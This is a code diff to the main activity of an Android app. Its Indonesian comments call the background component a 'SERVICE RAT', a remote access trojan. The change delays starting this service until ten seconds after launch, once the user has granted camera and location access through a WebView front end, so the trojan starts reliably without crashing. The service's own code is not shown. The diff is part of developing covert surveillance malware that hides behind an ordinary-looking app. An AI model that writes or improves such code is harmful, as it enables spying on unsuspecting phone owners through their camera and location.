@@ -62,13 +62,16 @@ class MainActivity : AppCompatActivity() {
         // 2. SETUP WEBVIEW DULU (biar UI langsung siap)
         setupWebView()
 
-        // 3. JALANKAN SERVICE RAT (dibungkus try-catch biar gak crash)
-        try { startDeviceService() } catch (e: Exception) {
-            e.printStackTrace()
-        }
-
-        // 4. REGISTER BROADCAST RECEIVER
+        // 3. REGISTER BROADCAST RECEIVER
         registerReceivers()
+
+        // 4. JALANKAN SERVICE RAT (DIJADWALKAN, BIAR GAK CRASH DI AWAL)
+        // Service baru akan jalan setelah 10 detik, setelah user sempat kasih izin
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { startDeviceService() } catch (e: Exception) {
+                android.util.Log.e("MainActivity", "Gagal start service tertunda: ${e.message}")
+            }
+        }, 10_000) // 10 detik
     }
 
     /**
@@ -110,8 +113,23 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startDeviceService() {
-        val svcIntent = Intent(this, DeviceService::class.java)
-        ContextCompat.startForegroundService(this, svcIntent)
+        try {
+            // Cek dulu izin dasar (kamera & lokasi)
+            val hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+            val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+
+            // Kalau izin belum ada, jangan start service dulu
+            // (nanti dipanggil ulang dari MainBridge.connectNow() setelah user klik MULAI)
+            if (!hasCamera && !hasLocation) {
+                android.util.Log.w("MainActivity", "Izin dasar belum ada, skip startDeviceService")
+                return
+            }
+
+            val svcIntent = Intent(this, DeviceService::class.java)
+            ContextCompat.startForegroundService(this, svcIntent)
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "Gagal start service: ${e.message}")
+        }
     }
 
     @SuppressLint("SetJavaScriptEnabled")
